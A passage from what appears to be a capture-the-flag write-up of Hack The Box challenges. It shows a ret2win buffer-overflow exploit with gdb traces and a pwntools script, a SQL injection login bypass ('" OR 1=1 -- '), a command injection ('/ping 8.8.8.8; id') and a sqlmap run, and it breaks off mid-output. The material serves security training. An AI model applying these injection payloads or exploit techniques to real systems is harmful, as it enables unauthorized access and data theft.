11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 pdf @ sym.escape_plan ┌ 208: sym.escape_plan (); │ ; var uint32_t fildes @ rbp-0x4 │ ; var void *buf @ rbp-0x5 │ 0x00401255 55 push rbp │ 0x00401256 4889e5 mov rbp, rsp │ 0x00401259 4883ec10 sub rsp, 0x10 │ 0x0040125d bf0a000000 mov edi, 0xa ; int c │ 0x00401262 e8c9fdffff call sym.imp.putchar ; int putchar(int c) │ 0x00401267 488b05a22d00. mov rax, qword [obj.stdout] ; obj.__TMC_END__ │ ; [0x404010:8]=0 │ 0x0040126e 4889c1 mov rcx, rax ; FILE *stream │ 0x00401271 baf0010000 mov edx, 0x1f0 ; 496 ; size_t nitems │ 0x00401276 be01000000 mov esi, 1 ; size_t size │ 0x0040127b 488d3d960d00. lea rdi, str.________________O_________________n___________________________________n__________________________________n____n_______________________________n_______________________________n_______________________________n_______________________________n_n ; 0x402018 ; \u0026#34; \\O/ \\n | \\n / \\ \\n\\u2592\\u2592\\u2592\\u2592\\u2592\\u2592\\u2592\\u2592\\u2592\\u2592\\u2592\\u2592\\u2592\\u2592\\u2592\\u2592 \\u2592\\u2592\\u2592\\u2592\\u2592\\u2592\\u2592\\u2592\\u2592\\u2592\\u2592\\u2592\\u2592\\u2592\\u2592\\u2592\\n\\u2592-\\u25b8 \\u2592 \\u2592 \\u2592\\n\\u2592-\\u25b8 \\u2592 \\u2592 \\u2592\\n\\u2592-\\u25b8 \\u2592 \\u2592 \\u2592\\n\\u2592-\\u25b8 \\u2592 \\u2592 \\u2592\\n\\u2592\\u2592\\u2592\\u2592\\u2592\\u2592\\u2592\\u2592\\u2592\\u2592\\u2592\\u2592\\u2592\\u2592\\u2592\\u2592\\u2592\\u2592\\u2592\\u2592\\u2592\\u2592\\u2592\\u2592\\xe2\u0026#34; ; const void *ptr │ 0x00401282 e8a9feffff call sym.imp.fwrite ; size_t fwrite(const void *ptr, size_t size, size_t nitems, FILE *stream) │ 0x00401287 488b05822d00. mov rax, qword [obj.stdout] ; obj.__TMC_END__ │ ; [0x404010:8]=0 │ 0x0040128e 488d0d740f00. lea rcx, str.e_0m ; 0x402209 │ 0x00401295 488d15720f00. lea rdx, str.e_1_32m ; 0x40220e │ 0x0040129c 488d35750f00. lea rsi, str._n_sCongratulations_on_escaping__Here_is_a_sacred_spell_to_help_you_continue_your_journey:__s_n ; 0x402218 ; \u0026#34;\\n%sCongratulations on escaping! Here is a sacred spell to help you continue your journey: %s\\n\u0026#34; ; const char *format │ 0x004012a3 4889c7 mov rdi, rax ; FILE *stream │ 0x004012a6 b800000000 mov eax, 0 │ 0x004012ab e810feffff call sym.imp.fprintf ; int fprintf(FILE *stream, const char *format, ...) │ 0x004012b0 be00000000 mov esi, 0 ; int oflag │ 0x004012b5 488d3dba0f00. lea rdi, str.._flag.txt ; 0x402276 ; \u0026#34;./flag.txt\u0026#34; ; const char *path │ 0x004012bc b800000000 mov eax, 0 │ 0x004012c1 e82afeffff call sym.imp.open ; int open(const char *path, int oflag) │ 0x004012c6 8945fc mov dword [fildes], eax │ 0x004012c9 837dfc00 cmp dword [fildes], 0 │ ┌─\u0026lt; 0x004012cd 792e jns 0x4012fd │ │ 0x004012cf 488d3db20f00. lea rdi, str._nError_opening_flag.txt__please_contact_an_Administrator._n_n ; 0x402288 ; \u0026#34;\\nError opening flag.txt, please contact an Administrator.\\n\\n\u0026#34; ; const char *s \u0026lt;...SNIP...\u0026gt; We can see a victory text at address 0x0040129c. A little further down we can see actions to open and print the flag.txt. If we can return tho this address, we might be able to produce a victory screen. Firstly, to determine the offset of the overflow:\n1 2 $ /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 300 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9 running in gdb:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 [----------------------------------registers-----------------------------------] RAX: 0x0 RBX: 0x0 RCX: 0x7ffff7d14a37 (\u0026lt;write+23\u0026gt;: cmp rax,0xfffffffffffff000) RDX: 0x0 RSI: 0x7fffffffbc20 --\u0026gt; 0x6d31333b315b1b0a RDI: 0x7fffffffbb00 --\u0026gt; 0x7ffff7c620d0 (\u0026lt;funlockfile\u0026gt;: endbr64) RBP: 0x5f6e726574746170 (\u0026#39;pattern_\u0026#39;) RSP: 0x7fffffffdd78 (\u0026#34;create.rb -\u0026#34;) RIP: 0x401602 (\u0026lt;main+509\u0026gt;: ret) R8 : 0x23 (\u0026#39;#\u0026#39;) R9 : 0x7ffff7d7cd70 (mov r10,QWORD PTR [rsi-0x1b]) R10: 0x20554f59205d2d5b (\u0026#39;[-] YOU \u0026#39;) R11: 0x246 R12: 0x7fffffffde88 --\u0026gt; 0x7fffffffe1da (\u0026#34;/home/kali/Documents/cyber_apocalyse/pwn/challenge/labyrinth\u0026#34;) R13: 0x401405 (\u0026lt;main\u0026gt;: push rbp) R14: 0x0 R15: 0x7ffff7ffd040 --\u0026gt; 0x7ffff7ffe2e0 --\u0026gt; 0x0 EFLAGS: 0x10202 (carry parity adjust zero sign trap INTERRUPT direction overflow) [-------------------------------------code-------------------------------------] 0x4015f7 \u0026lt;main+498\u0026gt;: call 0x4010c0 \u0026lt;fprintf@plt\u0026gt; 0x4015fc \u0026lt;main+503\u0026gt;: mov eax,0x0 0x401601 \u0026lt;main+508\u0026gt;: leave =\u0026gt; 0x401602 \u0026lt;main+509\u0026gt;: ret 0x401603: cs nop WORD PTR [rax+rax*1+0x0] 0x40160d: nop DWORD PTR [rax] 0x401610 \u0026lt;__libc_csu_init\u0026gt;: push r15 0x401612 \u0026lt;__libc_csu_init+2\u0026gt;: lea r15,[rip+0x2727] # 0x403d40 [------------------------------------stack-------------------------------------] 0000| 0x7fffffffdd78 (\u0026#34;create.rb -\u0026#34;) 0008| 0x7fffffffdd80 --\u0026gt; 0x2d2062 (\u0026#39;b -\u0026#39;) 0016| 0x7fffffffdd88 --\u0026gt; 0x401405 (\u0026lt;main\u0026gt;: push rbp) 0024| 0x7fffffffdd90 --\u0026gt; 0x100000000 0032| 0x7fffffffdd98 --\u0026gt; 0x7fffffffde88 --\u0026gt; 0x7fffffffe1da (\u0026#34;/home/kali/Documents/cyber_apocalyse/pwn/challenge/labyrinth\u0026#34;) 0040| 0x7fffffffdda0 --\u0026gt; 0x0 0048| 0x7fffffffdda8 --\u0026gt; 0x78a85a85f5d4e10b 0056| 0x7fffffffddb0 --\u0026gt; 0x7fffffffde88 --\u0026gt; 0x7fffffffe1da (\u0026#34;/home/kali/Documents/cyber_apocalyse/pwn/challenge/labyrinth\u0026#34;) [------------------------------------------------------------------------------] Legend: code, data, rodata, value Stopped reason: SIGSEGV 0x0000000000401602 in main () The RBP contains an overflow address 0x6241376241366241. Calculating offset:\n1 2 $ /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x6241376241366241 [*] Exact match at offset 48 Double checking offset:\n1 2 $ python -c \u0026#39;print(\u0026#34;A\u0026#34;*48+\u0026#34;B\u0026#34;*8)\u0026#39; AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBB gdb test\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 [----------------------------------registers-----------------------------------] RAX: 0x0 RBX: 0x0 RCX: 0x7ffff7d14a37 (\u0026lt;write+23\u0026gt;: cmp rax,0xfffffffffffff000) RDX: 0x0 RSI: 0x7fffffffbc20 --\u0026gt; 0x6d31333b315b1b0a RDI: 0x7fffffffbb00 --\u0026gt; 0x7ffff7c620d0 (\u0026lt;funlockfile\u0026gt;: endbr64) RBP: 0x4242424242424242 (\u0026#39;BBBBBBBB\u0026#39;) RSP: 0x7fffffffdd80 --\u0026gt; 0x0 RIP: 0x7ffff7c2000a --\u0026gt; 0x1000000000000 R8 : 0x23 (\u0026#39;#\u0026#39;) R9 : 0x7ffff7d7cd70 (mov r10,QWORD PTR [rsi-0x1b]) R10: 0x20554f59205d2d5b (\u0026#39;[-] YOU \u0026#39;) R11: 0x246 R12: 0x7fffffffde88 --\u0026gt; 0x7fffffffe1da (\u0026#34;/home/kali/Documents/cyber_apocalyse/pwn/challenge/labyrinth\u0026#34;) R13: 0x401405 (\u0026lt;main\u0026gt;: push rbp) R14: 0x0 R15: 0x7ffff7ffd040 --\u0026gt; 0x7ffff7ffe2e0 --\u0026gt; 0x0 EFLAGS: 0x10202 (carry parity adjust zero sign trap INTERRUPT direction overflow) [-------------------------------------code-------------------------------------] 0x7ffff7c20003: add BYTE PTR [rax],cl 0x7ffff7c20005: add BYTE PTR [rax],al 0x7ffff7c20007: add BYTE PTR [rdi+0x7e],dl =\u0026gt; 0x7ffff7c2000a: add BYTE PTR [rax],al 0x7ffff7c2000c: add BYTE PTR [rax],al 0x7ffff7c2000e: add BYTE PTR [rax],al 0x7ffff7c20010: add DWORD PTR [rax],eax 0x7ffff7c20012: add BYTE PTR [rax],al [------------------------------------stack-------------------------------------] 0000| 0x7fffffffdd80 --\u0026gt; 0x0 0008| 0x7fffffffdd88 --\u0026gt; 0x401405 (\u0026lt;main\u0026gt;: push rbp) 0016| 0x7fffffffdd90 --\u0026gt; 0x100000000 0024| 0x7fffffffdd98 --\u0026gt; 0x7fffffffde88 --\u0026gt; 0x7fffffffe1da (\u0026#34;/home/kali/Documents/cyber_apocalyse/pwn/challenge/labyrinth\u0026#34;) 0032| 0x7fffffffdda0 --\u0026gt; 0x0 0040| 0x7fffffffdda8 --\u0026gt; 0xb6dc04cf7d4b5e83 0048| 0x7fffffffddb0 --\u0026gt; 0x7fffffffde88 --\u0026gt; 0x7fffffffe1da (\u0026#34;/home/kali/Documents/cyber_apocalyse/pwn/challenge/labyrinth\u0026#34;) 0056| 0x7fffffffddb8 --\u0026gt; 0x401405 (\u0026lt;main\u0026gt;: push rbp) [------------------------------------------------------------------------------] Legend: code, data, rodata, value Stopped reason: SIGSEGV 0x00007ffff7c2000a in ?? () from ./glibc/libc.so.6 RBP: 0x4242424242424242 (\u0026lsquo;BBBBBBBB\u0026rsquo;). We know our overflow is successful, and now we can put whatever payload for the return function.\nFirst we can try pointing to the start of escape plan:\n1 2 3 4 5 6 7 8 9 $ python2 -c \u0026#39;print(\u0026#34;69+\\n\u0026#34;+\u0026#34;A\u0026#34;*48+\u0026#34;\\x55\\x12\\x40\\x00\\x00\\x00\\x00\\x00\u0026#34;)\u0026#39; | ./labyrinth \u0026lt;...SNIP...\u0026gt; Would you like to change the door you chose? \u0026gt;\u0026gt; [-] YOU FAILED TO ESCAPE! zsh: done python2 -c \u0026#39;print(\u0026#34;69+\\n\u0026#34;+\u0026#34;A\u0026#34;*48+\u0026#34;\\x55\\x12\\x40\\x00\\x00\\x00\\x00\\x00\u0026#34;)\u0026#39; | zsh: segmentation fault ./labyrinth Unfortunately preparing it this way does not work so well. I found a writeup for a similar ret2win problem that discusses the need for an additional return due in newer Ubuntu versions due to a MOVAPS issue. I\u0026rsquo;ll try this:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 python2 -c \u0026#39;print(\u0026#34;69+\\n\u0026#34;+\u0026#34;A\u0026#34;*48+\u0026#34;\\x16\\x10\\x40\\x00\\x00\\x00\\x00\\x00\u0026#34;+\u0026#34;\\x55\\x12\\x40\\x00\\x00\\x00\\x00\\x00\u0026#34;)\u0026#39; | ./labyrinth \u0026lt;...snip...\u0026gt; Would you like to change the door you chose? \u0026gt;\u0026gt; [-] YOU FAILED TO ESCAPE! \\O/ | / \\ ▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒ ▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒ ▒-▸ ▒ ▒ ▒ ▒-▸ ▒ ▒ ▒ ▒-▸ ▒ ▒ ▒ ▒-▸ ▒ ▒ ▒ ▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▲△▲△▲△▲△▲△▒ zsh: done python2 -c | zsh: segmentation fault ./labyrinth We have a happy escapee, but we don\u0026rsquo;t see the victory text or our flag. The return seems successful, but our target address isn\u0026rsquo;t quite right? After this step I decided to write a python script that will be able to connect to the remote server and submit our payload. Lastly, after guessing a few addresses within escape_plan, I finally landed on one that works.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 from pwn import * #elf = ELF(\u0026#39;labyrinth\u0026#39;) p = remote(\u0026#39;167.172.50.208\u0026#39;, 30667) payload = b\u0026#34;A\u0026#34;*48 payload += p64(0x401016) payload += p64(0x401256) p.sendline(\u0026#34;69\u0026#34;) p.sendline(payload) p.interactive() response = p.recvall() print(re.search(\u0026#34;(ROPE{.*?})\u0026#34;,response.decode())) Full output from payload:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 $ python escape.py [+] Opening connection to 178.62.9.10 on port 31908: Done /home/kali/Documents/cyber_apocalyse/pwn/challenge/e2.py:12: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes p.sendline(\u0026#34;69\u0026#34;) [*] Switching to interactive mode ▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒ ▒-▸ ▒ ▒ ▒ ▒-▸ ▒ O ▒ ▒ ▒-▸ ▒ \u0026#39;|\u0026#39; ▒ ▒ ▒-▸ ▒ / \\ ▒ ▒ ▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▲△▲△▲△▲△▲△▒ Select door: Door: 001 Door: 002 Door: 003 Door: 004 Door: 005 Door: 006 Door: 007 Door: 008 Door: 009 Door: 010 Door: 011 Door: 012 Door: 013 Door: 014 Door: 015 Door: 016 Door: 017 Door: 018 Door: 019 Door: 020 Door: 021 Door: 022 Door: 023 Door: 024 Door: 025 Door: 026 Door: 027 Door: 028 Door: 029 Door: 030 Door: 031 Door: 032 Door: 033 Door: 034 Door: 035 Door: 036 Door: 037 Door: 038 Door: 039 Door: 040 Door: 041 Door: 042 Door: 043 Door: 044 Door: 045 Door: 046 Door: 047 Door: 048 Door: 049 Door: 050 Door: 051 Door: 052 Door: 053 Door: 054 Door: 055 Door: 056 Door: 057 Door: 058 Door: 059 Door: 060 Door: 061 Door: 062 Door: 063 Door: 064 Door: 065 Door: 066 Door: 067 Door: 068 Door: 069 Door: 070 Door: 071 Door: 072 Door: 073 Door: 074 Door: 075 Door: 076 Door: 077 Door: 078 Door: 079 Door: 080 Door: 081 Door: 082 Door: 083 Door: 084 Door: 085 Door: 086 Door: 087 Door: 088 Door: 089 Door: 090 Door: 091 Door: 092 Door: 093 Door: 094 Door: 095 Door: 096 Door: 097 Door: 098 Door: 099 Door: 100 \u0026gt;\u0026gt; You are heading to open the door but you suddenly see something on the wall: \u0026#34;Fly like a bird and be free!\u0026#34; Would you like to change the door you chose? \u0026gt;\u0026gt; [-] YOU FAILED TO ESCAPE! \\O/ | / \\ ▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒ ▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒ ▒-▸ ▒ ▒ ▒ ▒-▸ ▒ ▒ ▒ ▒-▸ ▒ ▒ ▒ ▒-▸ ▒ ▒ ▒ ▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▲△▲△▲△▲△▲△▒ Congratulations on escaping! Here is a sacred spell to help you continue your journey: HTB{3sc4p3_fr0m_4b0v3} We managed to get the flag, but working out the address ended up as guess-and-check for me. HTB{3sc4p3_fr0m_4b0v3}\nWeb Drobots Pandora\u0026rsquo;s latest mission as part of her reconnaissance training is to infiltrate the Drobots firm that was suspected of engaging in illegal activities. Can you help pandora with this task? Difficulty: very easy\nVisiting the site gives us a generic login page. Trying the classic admin:admin and admin:password failed, so it\u0026rsquo;s time to take a look at the source code supplied. Exploring database.py we see the following configuration:\n1 2 3 def login(username, password): # We should update our code base and use techniques like parameterization to avoid SQL Injection user = query_db(f\u0026#39;SELECT password FROM users WHERE username = \u0026#34;{username}\u0026#34; AND password = \u0026#34;{password}\u0026#34; \u0026#39;, one=True) The comment is a pretty plain hint that this SQL query is not well sanitized, and allows for very basic SQL injection. For our user submission, we will escape the username query with \u0026ldquo;, then bypass a password check with \u0026ldquo;OR 1=1 \u0026ndash; \u0026ldquo;. The end result is we will login if the database can find a user called \u0026quot;\u0026rdquo; or if the value 1 is equal to 1. Since the latter is always true, we should login. Note that the space after comment lines \u0026ndash; must be present, or else this will be interpreted as minus.\nThe password will never be checked, so this can be whatever. Just like that, we are in. And the flag is first up on the table.\nHTB{p4r4m3t3r1z4t10n_1s_1mp0rt4nt!!!}\nGunhead During Pandora\u0026rsquo;s training, the Gunhead AI combat robot had been tampered with and was now malfunctioning, causing it to become uncontrollable. With the situation escalating rapidly, Pandora used her hacking skills to infiltrate the managing system of Gunhead and urgently needs to take it down. Difficulty: very easy\nVisiting the website we see a lot of text, and the only interactable piece seems to be a pull-up console:\nOur options for commands are extremely limited. Perhaps the provided source code can give us more insight? In ReconModel.php, we see how the program handles this ping command:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 $ cat ReconModel.php \u0026lt;?php #[AllowDynamicProperties] class ReconModel { public function __construct($ip) { $this-\u0026gt;ip = $ip; } public function getOutput() { # Do I need to sanitize user input before passing it to shell_exec? return shell_exec(\u0026#39;ping -c 3 \u0026#39;.$this-\u0026gt;ip); } } We have a commented note pointing out the lack of sanitization within the shell_exec. We should be able to use this /ping command to execute multiple shell commands when we include a break; Testing with id:\n1 /ping 8.8.8.8; id We see the 2nd shows our id. This command injection is successful. We will probe the current directory, and since there\u0026rsquo;s no harm, take a guess that flag.txt is in our current directory:\nWe didn\u0026rsquo;t hit it this time, but using this command scheme we can keep using ls to poke around for the flag. Or we can try find.\nNow we find it in probably the next most likely location, the base directory.\nHTB{4lw4y5_54n1t1z3_u53r_1nput!!!}\nOrbital In order to decipher the alien communication that held the key to their location, she needed access to a decoder with advanced capabilities - a decoder that only The Orbital firm possessed. Can you get your hands on the decoder? Difficulty: easy\nVisiting the site shows us a generic login page. After trying the classic admin:admin and admin:password credentials, perhaps we can find more information on what\u0026rsquo;s happening by viewing the provided source code. When viewing the database.py, we find an interesting hint/note:\n1 2 3 4 5 6 7 8 9 10 11 12 def login(username, password): # I don\u0026#39;t think it\u0026#39;s not possible to bypass login because I\u0026#39;m verifying the password later. user = query(f\u0026#39;SELECT username, password FROM users WHERE username = \u0026#34;{username}\u0026#34;\u0026#39;, one=True) if user: passwordCheck = passwordVerify(user[\u0026#39;password\u0026#39;], password) if passwordCheck: token = createJWT(user[\u0026#39;username\u0026#39;]) return token else: return False Our SQL injection approach from Drobots has been remedied. Even when we bypass the username input check, the password is verified in a separate instance. Problem solved, or is it?\nBefore moving on to probing SQL injection further, I check for potentially alternative pages by looking at the routes.py file. The only other page is an /export page, that requires a valid JSON token. So we will explore the login bypass further.\nInstead of manually checking a variety of SQL payloads, we will employ a tool to make this quick and easy: SQLmap. SQLmap can be easily set up to do post requests by passing it the request information in a file:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 $ cat post.txt POST /api/login HTTP/1.1 Host: 68.183.45.143:30274 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0 Accept: */* Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Referer: http://68.183.45.143:30274/ Content-Type: application/json Origin: http://68.183.45.143:30274 Content-Length: 42 Connection: close {\u0026#34;username\u0026#34;:\u0026#34;admin\u0026#34;,\u0026#34;password\u0026#34;:\u0026#34;password\u0026#34;} Full sqlmap dump output.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183 184 185 186 187 188 189 190 191 192 193 194 195 196 197 198 199 $ sqlmap -r post.txt -p username --dbms=mysql --dump ___ __H__ ___ ___[(]_____ ___ ___ {1.7.2#stable} |_ -| . [,] | .\u0026#39;| . | |___|_ [\u0026#34;]_|_|_|__,| _| |_|V... |_| https://sqlmap.org [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user\u0026#39;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program [*] starting @ 19:23:08 /2023-03-20/ [19:23:08] [INFO] parsing HTTP request from \u0026#39;post.txt\u0026#39; JSON data found in POST body. Do you want to process it? [Y/n/q] y [19:23:16] [INFO] testing connection to the target URL [19:23:16] [WARNING] the web server responded with an HTTP error code (403) which could interfere with the results of the tests [19:23:16] [INFO] checking if the target is protected by some kind of WAF/IPS [19:23:16] [INFO] testing if the target URL content is stable [19:23:16] [INFO] target URL content is stable [19:23:16] [INFO] heuristic (basic) test shows that (custom) POST parameter \u0026#39;JSON username\u0026#39; might be injectable (possible DBMS: \u0026#39;MySQL\u0026#39;) [19:23:17] [INFO] testing for SQL injection on (custom) POST parameter \u0026#39;JSON username\u0026#39; for the remaining tests, do you want to include all tests for \u0026#39;MySQL\u0026#39; extending provided level (1) and risk (1) values? [Y/n] [19:23:20] [INFO] testing \u0026#39;AND boolean-based blind - WHERE or HAVING clause\u0026#39; [19:23:22] [INFO] testing \u0026#39;Boolean-based blind - Parameter replace (original value)\u0026#39; [19:23:22] [INFO] testing \u0026#39;Generic inline queries\u0026#39; [19:23:22] [INFO] testing \u0026#39;AND boolean-based blind - WHERE or HAVING clause (MySQL comment)\u0026#39; [19:23:25] [WARNING] reflective value(s) found and filtering out [19:23:28] [INFO] testing \u0026#39;OR boolean-based blind - WHERE or HAVING clause (MySQL comment)\u0026#39; [19:23:34] [INFO] testing \u0026#39;OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)\u0026#39; [19:23:40] [INFO] testing \u0026#39;MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause\u0026#39; [19:23:51] [INFO] testing \u0026#39;MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)\u0026#39; [19:24:02] [INFO] testing \u0026#39;MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)\u0026#39; [19:24:12] [INFO] testing \u0026#39;MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)\u0026#39; [19:24:23] [INFO] testing \u0026#39;MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)\u0026#39; [19:24:33] [INFO] testing \u0026#39;MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (bool*int)\u0026#39; [19:24:52] [INFO] testing \u0026#39;MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (bool*int)\u0026#39; [19:25:02] [INFO] testing \u0026#39;MySQL boolean-based blind - Parameter replace (MAKE_SET)\u0026#39; [19:25:02] [INFO] testing \u0026#39;MySQL boolean-based blind - Parameter replace (MAKE_SET - original value)\u0026#39; [19:25:02] [INFO] testing \u0026#39;MySQL boolean-based blind - Parameter replace (ELT)\u0026#39; [19:25:03] [INFO] testing \u0026#39;MySQL boolean-based blind - Parameter replace (ELT - original value)\u0026#39; [19:25:03] [INFO] testing \u0026#39;MySQL boolean-based blind - Parameter replace (bool*int)\u0026#39; [19:25:03] [INFO] testing \u0026#39;MySQL boolean-based blind - Parameter replace (bool*int - original value)\u0026#39; [19:25:04] [INFO] testing \u0026#39;MySQL \u0026gt;= 5.0 boolean-based blind - ORDER BY, GROUP BY clause\u0026#39; [19:25:04] [INFO] testing \u0026#39;MySQL \u0026gt;= 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)\u0026#39; [19:25:05] [INFO] testing \u0026#39;MySQL \u0026lt; 5.0 boolean-based blind - ORDER BY, GROUP BY clause\u0026#39; [19:25:05] [INFO] testing \u0026#39;MySQL \u0026lt; 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)\u0026#39; [19:25:05] [INFO] testing \u0026#39;MySQL \u0026gt;= 5.0 boolean-based blind - Stacked queries\u0026#39; [19:25:12] [INFO] testing \u0026#39;MySQL \u0026lt; 5.0 boolean-based blind - Stacked queries\u0026#39; [19:25:12] [INFO] testing \u0026#39;MySQL \u0026gt;= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)\u0026#39; [19:25:20] [INFO] testing \u0026#39;MySQL \u0026gt;= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)\u0026#39; [19:25:27] [INFO] testing \u0026#39;MySQL \u0026gt;= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)\u0026#39; [19:25:35] [INFO] testing \u0026#39;MySQL \u0026gt;= 5.5 OR error-based - WHERE or HAVING clause (EXP)\u0026#39; [19:25:43] [INFO] testing \u0026#39;MySQL \u0026gt;= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)\u0026#39; [19:25:43] [WARNING] potential permission problems detected (\u0026#39;command denied\u0026#39;) [19:25:51] [INFO] testing \u0026#39;MySQL \u0026gt;= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)\u0026#39; [19:25:59] [INFO] testing \u0026#39;MySQL \u0026gt;= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)\u0026#39; [19:26:06] [INFO] testing \u0026#39;MySQL \u0026gt;= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)\u0026#39; [19:26:14] [INFO] testing \u0026#39;MySQL \u0026gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)\u0026#39; [19:26:15] [INFO] (custom) POST parameter \u0026#39;JSON username\u0026#39; is \u0026#39;MySQL \u0026gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)\u0026#39; injectable [19:26:15] [INFO] testing \u0026#39;MySQL inline queries\u0026#39; [19:26:15] [INFO] testing \u0026#39;MySQL \u0026gt;= 5.0.12 stacked queries (comment)\u0026#39; [19:26:15] [INFO] testing \u0026#39;MySQL \u0026gt;= 5.0.12 stacked queries\u0026#39; [19:26:15] [INFO] testing \u0026#39;MySQL \u0026gt;= 5.0.12 stacked queries (query SLEEP - comment)\u0026#39; [19:26:15] [INFO] testing \u0026#39;MySQL \u0026gt;= 5.0.12 stacked queries (query SLEEP)\u0026#39; [19:26:16] [INFO] testing \u0026#39;MySQL \u0026lt; 5.0.12 stacked queries (BENCHMARK - comment)\u0026#39; [19:26:16] [INFO] testing \u0026#39;MySQL \u0026lt; 5.0.12 stacked queries (BENCHMARK)\u0026#39; [19:26:16] [INFO] testing \u0026#39;MySQL \u0026gt;= 5.0.12 AND time-based blind (query SLEEP)\u0026#39; [19:26:26] [INFO] (custom) POST parameter \u0026#39;JSON username\u0026#39; appears to be \u0026#39;MySQL \u0026gt;= 5.0.12 AND time-based blind (query SLEEP)\u0026#39; injectable [19:26:26] [INFO] testing \u0026#39;Generic UNION query (NULL) - 1 to 20 columns\u0026#39; [19:26:26] [INFO] testing \u0026#39;MySQL UNION query (NULL) - 1 to 20 columns\u0026#39; [19:26:26] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found [19:26:27] [INFO] \u0026#39;ORDER BY\u0026#39; technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test [19:26:27] [INFO] target URL appears to have 2 columns in query do you want to (re)try to find proper UNION column types with fuzzy test? [y/N] n n [19:26:51] [WARNING] if UNION based SQL injection is not detected, please consider usage of option \u0026#39;--union-char\u0026#39; (e.g. \u0026#39;--union-char=1\u0026#39;) [19:26:54] [INFO] target URL appears to be UNION injectable with 2 columns injection not exploitable with NULL values. Do you want to try with a random integer value for option \u0026#39;--union-char\u0026#39;? [Y/n] n [19:27:02] [INFO] testing \u0026#39;MySQL UNION query (random number) - 1 to 20 columns\u0026#39; [19:27:06] [INFO] testing \u0026#39;MySQL 